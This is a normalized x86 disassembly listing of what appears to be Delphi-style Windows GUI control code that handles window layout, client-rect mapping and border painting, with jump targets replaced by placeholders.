movsd [ edi ] [ esi ]
jmp r-xdata
mov eax [ esp ]
mov [ ebx + 0x40 ] eax
mov eax [ esp + 0x4 ]
mov [ ebx + 0x44 ] eax
mov eax [ esp + 0x8 ]
sub eax [ esp ]
mov [ ebx + 0x48 ] eax
mov eax [ esp + 0xc ]
sub eax [ esp + 0x4 ]
mov [ ebx + 0x4c ] eax
mov eax ebx
call sub_4399a0
add esp 0x3c
pop edi
pop esi
pop ebx
retn
push 0xfffffff8
mov eax [ ebx + 0x180 ]
push eax
call GetWindowLongA
mov esi eax
test esi esi
je r-xdata
push 0xfffffff0
mov eax [ ebx + 0x180 ]
push eax
call GetWindowLongA
test eax 0x40000000
je r-xdata
push esp
push esi
call ScreenToClient
lea eax [ esp + 0x8 ]
push eax
push esi
call ScreenToClient
sub_440ef0
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov [ esp ] edx
mov ebp eax
mov eax [ ebp + 0x194 ]
test eax eax
je r-xdata
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov edi [ eax + 0x8 ]
dec edi
test edi edi
jl r-xdata
inc edi
mov [ esp + 0x4 ] 0x0
mov eax [ ebp + 0x194 ]
mov edx [ esp + 0x4 ]
call sub_413d6c
mov ebx eax
mov edx ebx
mov eax [ esp ]
call sub_413c10
mov edx [ esp ]
mov eax ebx
mov si 0xffb4
call sub_403300
inc [ esp + 0x4 ]
dec edi
jne r-xdata
sub_440f50
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
mov [ ebp - 0x5 ] cl
mov edi edx
mov [ ebp - 0x4 ] eax
xor eax eax
mov [ ebp - 0xc ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_4030d4
mov [ ebp - 0x14 ] eax
xor eax eax
push ebp
push sub_441046
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0x14 ]
mov eax [ ebp - 0x4 ]
mov si 0xffb4
call sub_403300
mov eax [ ebp - 0x14 ]
cmp [ eax + 0x8 ] 0x0
jle r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44104d
mov eax [ ebp - 0x14 ]
call sub_403104
retn
mov edx edi
mov eax [ ebp - 0x14 ]
call sub_413dc8
mov [ ebp - 0x10 ] eax
cmp [ ebp - 0x10 ] 0xffffffff
jne r-xdata
mov ebx [ ebp - 0x10 ]
cmp [ ebp - 0x5 ] 0x0
je r-xdata
test ebx ebx
jne r-xdata
inc ebx
mov eax [ ebp - 0x14 ]
cmp ebx [ eax + 0x8 ]
jne r-xdata
xor eax eax
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x14 ]
mov eax [ eax + 0x8 ]
dec eax
mov [ ebp - 0x10 ] eax
jmp r-xdata
dec ebx
mov eax [ ebp - 0x14 ]
mov ebx [ eax + 0x8 ]
mov edx ebx
mov eax [ ebp - 0x14 ]
call sub_413d6c
mov edi eax
mov eax edi
mov si 0xffb8
call sub_403300
test al al
je r-xdata
xor ebx ebx
jmp r-xdata
cmp [ ebp - 0xc ] 0x0
jne r-xdata
cmp [ ebp + 0xc ] 0x0
je r-xdata
cmp ebx [ ebp - 0x10 ]
jne r-xdata
cmp [ ebp + 0x8 ] 0x0
je r-xdata
cmp [ edi + 0x1a4 ] 0x0
je r-xdata
cmp [ ebp - 0x5 ] 0x0
je r-xdata
mov [ ebp - 0xc ] edi
mov eax [ edi + 0x30 ]
cmp eax [ ebp - 0x4 ]
jne r-xdata
sub_44105c
push ebp
mov ebp esp
push esi
mov esi edx
mov edx [ ebp + 0x8 ]
push edx
xor dl 0x1
push edx
mov edx esi
call sub_440f50
mov esi eax
test esi esi
je r-xdata
pop esi
pop ebp
retn 0x4
mov eax esi
mov edx [ eax ]
call [ edx + 0xc4 ]
sub_441088
push ebx
push esi
mov ebx eax
mov eax ebx
call sub_4514e0
mov esi eax
test esi esi
je r-xdata
pop esi
pop ebx
retn
push 0x1
push 0x0
mov cl 0x1
xor edx edx
mov eax ebx
call sub_440f50
test eax eax
jne r-xdata
test eax eax
je r-xdata
push 0x0
push 0x0
mov cl 0x1
xor edx edx
mov eax ebx
call sub_440f50
mov edx eax
mov eax esi
call sub_45514c
sub_4410cc
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_43d858
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x8
inc ebx
xor esi esi
inc esi
dec ebx
jne r-xdata
mov edx eax
mov eax [ ebp + 0xc ]
call [ ebp + 0x8 ]
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_43d81c
mov edx [ eax + 0x4 ]
cmp edx [ ebp - 0x8 ]
jne r-xdata
sub_441114
push ebx
push esi
mov esi ecx
mov ebx edx
mov eax ebx
mov edx [ r-xdata ]
call sub_403290
test al al
je r-xdata
mov eax ebx
mov edx [ r-xdata ]
call sub_403290
test al al
je r-xdata
mov edx esi
mov eax ebx
call sub_4407d0
pop esi
pop ebx
retn
pop esi
pop ebx
retn
mov edx esi
mov eax ebx
call sub_43a5bc
sub_44115c
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov eax [ esi + 0x74 ]
cmp [ eax + 0x14 ] 0x0
jbe r-xdata
xor edx edx
mov [ edi ] edx
mov edx [ esi + 0x74 ]
mov edx [ edx + 0x14 ]
mov [ edi ] edx
jmp r-xdata
xor edx edx
mov [ ecx ] edx
mov edx [ esi + 0x74 ]
mov edx [ edx + 0x10 ]
mov [ ecx ] edx
jmp r-xdata
cmp [ eax + 0x10 ] 0x0
jbe r-xdata
mov edx [ ebp + 0xc ]
xor ebx ebx
mov [ edx ] ebx
mov edx [ esi + 0x74 ]
mov edx [ edx + 0xc ]
mov ebx [ ebp + 0xc ]
mov [ ebx ] edx
jmp r-xdata
cmp [ eax + 0xc ] 0x0
jbe r-xdata
mov eax [ ebp + 0x8 ]
xor edx edx
mov [ eax ] edx
mov eax [ esi + 0x74 ]
mov eax [ eax + 0x8 ]
mov edx [ ebp + 0x8 ]
mov [ edx ] eax
jmp r-xdata
cmp [ eax + 0x8 ] 0x0
jbe r-xdata
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov edx edi
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x38 ]
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
sub_4411e0
push ebp
mov ebp esp
add esp 0xffffffa0
push ebx
push esi
push edi
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov esi eax
mov eax esi
call sub_440e2c
test al al
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
mov eax esi
call sub_43d858
test eax eax
je r-xdata
lea edx [ ebp - 0x5d ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x44 ]
lea edx [ ebp - 0x5d ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x8c ]
lea eax [ ebp - 0x5d ]
push eax
call IsRectEmpty
test eax eax
jne r-xdata
mov eax [ esi + 0x48 ]
mov edx [ ebp - 0x55 ]
sub edx [ ebp - 0x5d ]
sub eax edx
mov [ ebp - 0xc ] eax
mov edx [ esi + 0x4c ]
mov ecx [ ebp - 0x51 ]
sub ecx [ ebp - 0x59 ]
sub edx ecx
mov [ ebp - 0x10 ] edx
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x18 ] edx
mov eax [ ebp - 0x4 ]
cmp [ eax ] 0x0
jle r-xdata
mov eax [ ebp - 0x8 ]
cmp [ eax ] 0x0
jle r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0xc ]
sub [ eax ] edx
mov eax [ ebp + 0xc ]
cmp [ eax ] 0x0
jle r-xdata
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x10 ]
sub [ eax ] edx
mov eax [ ebp + 0x8 ]
cmp [ eax ] 0x0
jle r-xdata
mov eax [ ebp + 0xc ]
mov edx [ ebp - 0x14 ]
sub [ eax ] edx
xor ecx ecx
push ebp
push sub_4415a2
push [ fs : ecx ]
mov [ fs : ecx ] esp
xor eax eax
mov [ ebp - 0x20 ] eax
xor eax eax
mov [ ebp - 0x30 ] eax
xor eax eax
mov [ ebp - 0x24 ] eax
xor eax eax
mov [ ebp - 0x34 ] eax
xor eax eax
mov [ ebp - 0x28 ] eax
xor eax eax
mov [ ebp - 0x38 ] eax
xor eax eax
mov [ ebp - 0x2c ] eax
xor eax eax
mov [ ebp - 0x3c ] eax
mov eax esi
call sub_43d858
mov edi eax
dec edi
test edi edi
jl r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ ebp - 0x18 ]
sub [ eax ] edx
cmp [ ebp - 0x20 ] 0x0
jle r-xdata
inc edi
mov [ ebp - 0x1c ] 0x0
cmp [ ebp - 0x24 ] 0x0
jle r-xdata
mov eax [ ebp - 0x20 ]
add eax [ ebp - 0x30 ]
mov edx [ ebp - 0x4 ]
cmp eax [ edx ]
jle r-xdata
lea eax [ ebp - 0x44 ]
push eax
lea eax [ ebp - 0x4c ]
push eax
lea ecx [ ebp - 0x48 ]
lea edx [ ebp - 0x40 ]
mov eax ebx
call sub_44115c
mov al [ ebx + 0x5b ]
sub al 0x1
jb r-xdata
test [ ebx + 0x1c ] 0x10
je r-xdata
cmp [ ebp - 0x28 ] 0x0
jle r-xdata
mov eax [ ebp + 0xc ]
cmp [ eax ] 0x0
je r-xdata
mov eax [ ebp - 0x20 ]
add eax [ ebp - 0x30 ]
mov edx [ ebp - 0x4 ]
mov [ edx ] eax
mov al [ ebx + 0x61 ]
and al [ r-xdata ]
mov dl [ r-xdata ]
cmp dl al
jne r-xdata
sub al 0x2
jb r-xdata
inc [ ebp - 0x1c ]
dec edi
jne r-xdata
test [ ebx + 0x51 ] 0x4
jne r-xdata
cmp [ ebp - 0x2c ] 0x0
jle r-xdata
mov eax [ ebp - 0x28 ]
add eax [ ebp - 0x38 ]
mov edx [ ebp - 0x8 ]
cmp eax [ edx ]
jle r-xdata
mov eax [ ebp - 0x24 ]
add eax [ ebp - 0x34 ]
mov edx [ ebp + 0xc ]
mov [ edx ] eax
mov eax [ ebp - 0x24 ]
add eax [ ebp - 0x34 ]
mov edx [ ebp + 0xc ]
cmp eax [ edx ]
jle r-xdata
mov [ ebp - 0x4d ] 0x0
jmp r-xdata
mov [ ebp - 0x4d ] 0x1
cmp [ ebp - 0x40 ] 0x0
jle r-xdata
mov [ ebp - 0x4d ] 0x1
jmp r-xdata
sub al 0x2
je r-xdata
mov edx [ ebp - 0x1c ]
mov eax esi
call sub_43d81c
mov ebx eax
cmp [ ebx + 0x57 ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax ] 0x0
jle r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax ] 0x0
je r-xdata
mov eax [ ebp - 0x28 ]
add eax [ ebp - 0x38 ]
mov edx [ ebp - 0x8 ]
mov [ edx ] eax
mov al [ ebx + 0x5b ]
sub al 0x1
jb r-xdata
cmp [ ebp - 0x44 ] 0x0
jle r-xdata
mov eax [ ebp - 0x55 ]
sub eax [ ebp - 0x5d ]
sub eax [ ebx + 0x48 ]
sub eax [ ebp - 0x40 ]
mov [ ebp - 0x40 ] eax
mov [ ebp - 0x4d ] 0x2
jmp r-xdata
jmp r-xdata
mov eax [ ebp - 0x8 ]
cmp [ eax ] 0x0
jle r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0xc ]
add [ eax ] edx
mov eax [ ebp - 0x2c ]
add eax [ ebp - 0x3c ]
mov edx [ ebp + 0x8 ]
mov [ edx ] eax
mov eax [ ebp - 0x2c ]
add eax [ ebp - 0x3c ]
mov edx [ ebp + 0x8 ]
cmp eax [ edx ]
jle r-xdata
mov al [ ebx + 0x61 ]
and al [ r-xdata ]
mov dl [ r-xdata ]
cmp dl al
jne r-xdata
add al 0xfe
sub al 0x2
jb r-xdata
mov eax [ ebp - 0x55 ]
sub eax [ ebp - 0x5d ]
add eax [ ebp - 0x44 ]
sub eax [ ebx + 0x48 ]
mov [ ebp - 0x44 ] eax
jmp r-xdata
mov [ ebp - 0x4d ] 0x3
mov eax [ ebp + 0xc ]
cmp [ eax ] 0x0
jle r-xdata
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x10 ]
add [ eax ] edx
xor eax eax
jmp r-xdata
mov al 0x1
cmp [ ebp - 0x48 ] 0x0
jle r-xdata
mov al 0x1
jmp r-xdata
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax ] 0x0
jle r-xdata
mov eax [ ebp + 0xc ]
mov edx [ ebp - 0x14 ]
add [ eax ] edx
mov dl [ ebp - 0x4d ]
dec edx
sub dl 0x2
jb r-xdata
cmp [ ebp - 0x4c ] 0x0
jle r-xdata
mov edx [ ebp - 0x51 ]
sub edx [ ebp - 0x59 ]
sub edx [ ebx + 0x4c ]
sub edx [ ebp - 0x48 ]
mov [ ebp - 0x48 ] edx
mov al 0x2
jmp r-xdata
jmp r-xdata
retn
mov eax [ ebp + 0x8 ]
mov edx [ ebp - 0x18 ]
add [ eax ] edx
cmp [ ebp - 0x40 ] 0x0
jle r-xdata
je r-xdata
mov edx [ ebp - 0x51 ]
sub edx [ ebp - 0x59 ]
add edx [ ebp - 0x4c ]
sub edx [ ebx + 0x4c ]
mov [ ebp - 0x4c ] edx
jmp r-xdata
mov al 0x3
cmp [ ebp - 0x44 ] 0x0
jle r-xdata
mov edx [ ebp - 0x4 ]
mov edx [ edx ]
cmp edx [ ebp - 0x40 ]
jge r-xdata
mov edx [ ebx + 0x48 ]
add [ ebp - 0x30 ] edx
add [ ebp - 0x34 ] edx
jmp r-xdata
dec eax
sub al 0x2
jb r-xdata
mov edx [ ebp + 0xc ]
mov edx [ edx ]
cmp edx [ ebp - 0x44 ]
jle r-xdata
mov edx [ ebp - 0x4 ]
mov ecx [ ebp - 0x40 ]
mov [ edx ] ecx
mov edx [ ebp - 0x4 ]
mov edx [ edx ]
cmp edx [ ebp - 0x20 ]
jle r-xdata
cmp [ ebp - 0x48 ] 0x0
jle r-xdata
je r-xdata
mov edx [ ebp + 0xc ]
mov ecx [ ebp - 0x44 ]
mov [ edx ] ecx
mov edx [ ebp + 0xc ]
mov edx [ edx ]
cmp edx [ ebp - 0x24 ]
jle r-xdata
mov edx [ ebp - 0x4 ]
mov edx [ edx ]
mov [ ebp - 0x20 ] edx
cmp [ ebp - 0x4c ] 0x0
jle r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
cmp eax [ ebp - 0x48 ]
jge r-xdata
mov eax [ ebx + 0x4c ]
add [ ebp - 0x38 ] eax
add [ ebp - 0x3c ] eax
jmp r-xdata
mov edx [ ebp + 0xc ]
mov edx [ edx ]
mov [ ebp - 0x24 ] edx
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
cmp eax [ ebp - 0x4c ]
jle r-xdata
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x48 ]
mov [ eax ] edx
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
cmp eax [ ebp - 0x28 ]
jle r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ ebp - 0x4c ]
mov [ eax ] edx
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
cmp eax [ ebp - 0x2c ]
jle r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
mov [ ebp - 0x28 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
mov [ ebp - 0x2c ] eax
jmp r-xdata
sub_4415b9
add [ eax ] al
add [ ebp - 0x75 ] dl
in al dx
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov ecx edi
mov edx esi
mov eax ebx
call sub_4411e0
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov ecx edi
mov edx esi
mov eax ebx
call sub_43b390
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
sub_4415f8
push ebx
push esi
push edi
mov ebx ecx
mov esi edx
mov edi eax
mov ecx ebx
mov edx esi
mov eax edi
call sub_43c214
mov eax esi
mov edx [ r-xdata ]
call sub_403290
test al al
je r-xdata
pop edi
pop esi
pop ebx
retn
test bl bl
je r-xdata
mov edx [ esi + 0x74 ]
mov eax edi
call sub_439cb4
cmp [ edi + 0x158 ] 0x0
jne r-xdata
sub_441640
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_43c434
mov eax esi
mov edx [ r-xdata ]
call sub_403290
test al al
je r-xdata
pop esi
pop ebx
retn
mov edx [ ebx + 0x158 ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x48 ]
sub_441670
push ebp
mov ebp esp
add esp 0xffffffc8
push ebx
push esi
push edi
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov [ ebp - 0xd ] 0x1
mov eax [ ebp - 0x4 ]
call sub_440e2c
test al al
je r-xdata
mov al [ ebp - 0xd ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x5b ] 0x5
je r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x10
je r-xdata
lea edx [ ebp - 0x28 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0xb4 ]
lea edx [ ebp - 0x38 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x44 ]
lea edx [ ebp - 0x38 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x8c ]
mov eax [ ebp - 0x4 ]
call sub_43d3c0
xor ecx ecx
push ebp
push sub_44179f
push [ fs : ecx ]
mov [ fs : ecx ] esp
mov eax [ ebp - 0x4 ]
call sub_43d858
mov esi eax
dec esi
test esi esi
jl r-xdata
mov eax [ ebp - 0x4 ]
call sub_43d858
test eax eax
jle r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4417a6
mov eax [ ebp - 0x4 ]
and [ eax + 0x54 ] 0xffef
mov eax [ ebp - 0x4 ]
call sub_43d3c8
retn
inc esi
mov [ ebp - 0x14 ] 0x0
mov edx [ ebp - 0x4 ]
mov dl [ edx + 0x5b ]
mov ecx edx
test cl cl
je r-xdata
test [ eax + 0x1c ] 0x10
je r-xdata
mov edi [ ebp - 0x28 ]
sub edi [ ebp - 0x38 ]
jmp r-xdata
add cl 0xfd
sub cl 0x2
jae r-xdata
inc [ ebp - 0x14 ]
dec esi
jne r-xdata
test [ eax + 0x51 ] 0x4
jne r-xdata
sub dl 0x3
jae r-xdata
xor edi edi
mov edx [ ebp - 0x14 ]
mov eax [ ebp - 0x4 ]
call sub_43d81c
cmp [ eax + 0x57 ] 0x0
jne r-xdata
xor edx edx
mov [ ebp - 0x18 ] edx
mov edx [ ebp - 0x24 ]
sub edx [ ebp - 0x34 ]
mov [ ebp - 0x18 ] edx
jmp r-xdata
mov edx [ eax + 0x48 ]
push edx
mov edx [ eax + 0x4c ]
push edx
mov ecx [ eax + 0x44 ]
sub ecx [ ebp - 0x18 ]
mov edx [ eax + 0x40 ]
sub edx edi
mov ebx [ eax ]
call [ ebx + 0x84 ]
sub_4417a6
mov eax [ ebp - 0x4 ]
mov dl [ eax + 0x5b ]
mov eax edx
test al al
je r-xdata
mov eax [ ebp - 0x20 ]
sub eax [ ebp - 0x28 ]
test eax eax
jle r-xdata
add al 0xfd
sub al 0x2
jae r-xdata
mov eax [ ebp - 0x8 ]
xor edx edx
mov [ eax ] edx
mov ecx [ ebp - 0x4 ]
add eax [ ecx + 0x48 ]
mov ecx [ ebp - 0x30 ]
sub ecx [ ebp - 0x38 ]
sub eax ecx
mov ecx [ ebp - 0x8 ]
mov [ ecx ] eax
cmp dl 0x4
jne r-xdata
mov eax [ ebp - 0x4 ]
mov dl [ eax + 0x5b ]
mov eax edx
sub al 0x3
jae r-xdata
mov al [ ebp - 0xd ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x1c ]
sub eax [ ebp - 0x24 ]
test eax eax
jle r-xdata
mov eax [ ebp - 0x4 ]
mov si 0xffd0
call sub_403300
jmp r-xdata
mov eax [ ebp - 0xc ]
xor edx edx
mov [ eax ] edx
mov ecx [ ebp - 0x4 ]
add eax [ ecx + 0x4c ]
mov ecx [ ebp - 0x2c ]
sub ecx [ ebp - 0x34 ]
sub eax ecx
mov ecx [ ebp - 0xc ]
mov [ ecx ] eax
cmp dl 0x2
jne r-xdata
mov eax [ ebp - 0x4 ]
mov si 0xffd0
call sub_403300
jmp r-xdata
sub_44183c
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov eax [ esi + 0x8 ]
mov esi eax
mov eax [ ebx + 0x16c ]
neg eax
push eax
mov edx [ ebx + 0x16c ]
neg edx
push eax
mov edi esi
push edi
call InflateRect
cmp [ ebx + 0x165 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
retn
xor eax eax
cmp [ ebx + 0x163 ] 0x0
je r-xdata
cmp [ ebx + 0x164 ] 0x0
je r-xdata
add eax [ ebx + 0x168 ]
mov esi edi
test [ ebx + 0x162 ] 0x1
je r-xdata
add eax [ ebx + 0x168 ]
test [ ebx + 0x162 ] 0x2
je r-xdata
add [ esi ] eax
test [ ebx + 0x162 ] 0x4
je r-xdata
add [ esi + 0x4 ] eax
test [ ebx + 0x162 ] 0x8
je r-xdata
sub [ esi + 0x8 ] eax
sub [ esi + 0xc ] eax
sub_4418cc
push ebp
mov ebp esp
add esp 0xffffffc4
push ebx
push esi
push edi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x165 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
call sub_440b28
push eax
call GetWindowDC
mov [ ebp - 0xc ] eax
xor edx edx
push ebp
push sub_441b32
push [ fs : edx ]
mov [ fs : edx ] esp
lea eax [ ebp - 0x1c ]
push eax
mov eax [ ebp - 0x4 ]
call sub_440b28
push eax
call GetClientRect
lea eax [ ebp - 0x2c ]
push eax
mov eax [ ebp - 0x4 ]
call sub_440b28
push eax
call GetWindowRect
push 0x2
lea eax [ ebp - 0x2c ]
push eax
mov eax [ ebp - 0x4 ]
call sub_440b28
push eax
push 0x0
call MapWindowPoints
mov eax [ ebp - 0x28 ]
neg eax
push eax
mov eax [ ebp - 0x2c ]
neg eax
push eax
lea eax [ ebp - 0x1c ]
push eax
call OffsetRect
mov eax [ ebp - 0x10 ]
push eax
mov eax [ ebp - 0x14 ]
push eax
mov eax [ ebp - 0x18 ]
push eax
mov eax [ ebp - 0x1c ]
push eax
mov eax [ ebp - 0xc ]
push eax
call ExcludeClipRect
lea esi [ ebp - 0x2c ]
lea edi [ ebp - 0x3c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x16c ]
push eax
push eax
lea eax [ ebp - 0x1c ]
push eax
call InflateRect
lea esi [ ebp - 0x1c ]
lea edi [ ebp - 0x2c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x165 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x16c ] 0x0
jbe r-xdata
mov eax [ ebp - 0x20 ]
push eax
mov eax [ ebp - 0x24 ]
push eax
mov eax [ ebp - 0x28 ]
push eax
mov eax [ ebp - 0x2c ]
push eax
mov eax [ ebp - 0xc ]
push eax
call IntersectClipRect
lea esi [ ebp - 0x3c ]
lea edi [ ebp - 0x2c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov eax [ ebp - 0x28 ]
neg eax
push eax
mov eax [ ebp - 0x2c ]
neg eax
push eax
lea eax [ ebp - 0x2c ]
push eax
call OffsetRect
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x170 ]
call sub_41d428
push eax
lea eax [ ebp - 0x2c ]
push eax
mov eax [ ebp - 0xc ]
push eax
call FillRect
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x4 ]
call sub_440b28
push eax
call ReleaseDC
retn
xor ebx ebx
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x163 ] 0x0
je r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx - 0x10 ]
call sub_42f358
call sub_42f438
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x164 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
add ebx [ eax + 0x168 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
test [ eax + 0x52 ] 0x2
je r-xdata
push 0xfffffff0
mov eax [ ebp - 0x4 ]
call sub_440b28
push eax
call GetWindowLongA
mov esi eax
mov eax [ ebp - 0x4 ]
test [ eax + 0x162 ] 0x1
je r-xdata
mov eax [ ebp - 0x4 ]
add ebx [ eax + 0x168 ]
call sub_42f358
xor ecx ecx
mov edx [ ebp - 0x4 ]
call sub_42fb84
mov eax [ ebp - 0x4 ]
test [ eax + 0x162 ] 0x2
je r-xdata
sub [ ebp - 0x2c ] ebx
mov eax [ ebp - 0x4 ]
test [ eax + 0x162 ] 0x4
je r-xdata
sub [ ebp - 0x28 ] ebx
test esi 0x200000
je r-xdata
add [ ebp - 0x24 ] ebx
mov eax [ ebp - 0x4 ]
test [ eax + 0x162 ] 0x8
je r-xdata
push 0x14
mov eax [ rw-data ]
mov eax [ eax ]
call eax
add [ ebp - 0x24 ] eax
test esi 0x100000
je r-xdata
add [ ebp - 0x20 ] ebx
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x162 ]
mov edx [ ebp - 0x4 ]
movzx edx [ edx + 0x165 ]
or eax [ edx * 4 + rw-data ]
mov edx [ ebp - 0x4 ]
movzx edx [ edx + 0x1a5 ]
or eax [ edx * 4 + rw-data ]
or eax 0x2000
push eax
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x163 ]
mov eax [ eax * 4 + rw-data ]
mov edx [ ebp - 0x4 ]
movzx edx [ edx + 0x164 ]
or eax [ edx * 4 + rw-data ]
push eax
lea eax [ ebp - 0x2c ]
push eax
mov eax [ ebp - 0xc ]
push eax
call DrawEdge
push 0x15
mov eax [ rw-data ]
mov eax [ eax ]
call eax
add [ ebp - 0x20 ] eax
sub_441b74
push ebx
push esi
push edi
add esp 0xfffffff0
mov ebx edx
mov esi eax
cmp [ ebx + 0xc ] 0x0
jne r-xdata
add esp 0x10
pop edi
pop esi
pop ebx
retn
push 0x0
lea edx [ esp + 0xc ]
mov eax [ ebx + 0x8 ]
call sub_40682c
lea edx [ esp + 0xc ]
lea ecx [ esp + 0x4 ]
mov eax esi
call sub_439e90
lea edx [ esp + 0x4 ]
xor ecx ecx
mov eax esi
call sub_43e414
mov edi eax
test edi edi
je r-xdata
cmp [ ebx + 0xc ] 0x0
jne r-xdata
mov eax [ ebx + 0x8 ]
push eax
xor ecx ecx
mov edx 0x7b
mov eax edi
call sub_43b4f4
mov [ ebx + 0xc ] eax
mov edx ebx
mov eax esi
call sub_43c6b8
sub_441be0
push ebx
push esi
mov esi edx
call sub_4514e0
mov ebx eax
test ebx ebx
je r-xdata
pop esi
pop ebx
retn
sub si 0x9
je r-xdata
push 0x0
mov dx 0x1
mov ax 0x2
call sub_4067c8
mov ecx eax
mov edx 0x127
mov eax ebx
call sub_43b4f4
jmp r-xdata
sub si 0x9
je r-xdata
push 0x0
mov dx 0x2
mov ax 0x2
call sub_4067c8
mov ecx eax
mov edx 0x127
mov eax ebx
call sub_43b4f4
add esi 0xffffffed
sub si 0x4
jae r-xdata
sub_441c44
push esi
mov esi eax
cmp [ edx + 0xc ] 0x1
je r-xdata
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
test [ edx + 0x8 ] 0x1
je r-xdata
mov eax esi
call sub_43e7dc
jmp r-xdata
cmp [ esi + 0x57 ] 0x0
je r-xdata
pop esi
retn
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
pop esi
retn
sub_441c7c
push ebx
push esi
mov ebx edx
mov esi eax
mov eax esi
call sub_441c74
cmp bl al
je r-xdata
pop esi
pop ebx
retn
test bl bl
je r-xdata
mov eax [ r-xdata ]
not eax
and eax [ esi + 0x50 ]
mov [ esi + 0x50 ] eax
mov eax [ r-xdata ]
or eax [ esi + 0x50 ]
mov [ esi + 0x50 ] eax
jmp r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x7c ]
sub_441cbc
push ebp
mov ebp esp
push ecx
push ebx
push esi
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
xor edx edx
mov eax ebx
call sub_43944c
mov dl 0x1
mov eax [ r-xdata ]
call sub_41d544
mov esi eax
mov [ ebx + 0x160 ] esi
mov eax esi
mov edx ebx
call sub_438f28
